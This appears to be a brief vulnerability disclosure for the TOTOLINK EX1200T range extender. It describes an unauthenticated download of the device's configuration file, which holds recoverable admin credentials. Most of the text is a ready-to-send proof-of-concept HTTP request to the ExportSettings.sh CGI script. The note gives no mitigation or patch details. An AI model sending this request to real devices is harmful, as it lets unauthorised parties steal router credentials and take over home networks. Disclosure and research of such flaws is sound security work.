# TOTOLINK EX1200T LEAK

## Vulnerability Description

PRODUCT: TOTOLINK EX1200T V4.1.2cu.5215 (latest version)

The attacker can get the **apmib** configuration file `Config-EX1200T-xxxxxxxx.dat` without authorization, username and password can be found in the decoded file.

## PoC

```
GET /cgi-bin/ExportSettings.sh HTTP/1.1
Host: 192.168.0.1
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
Connection: close
```

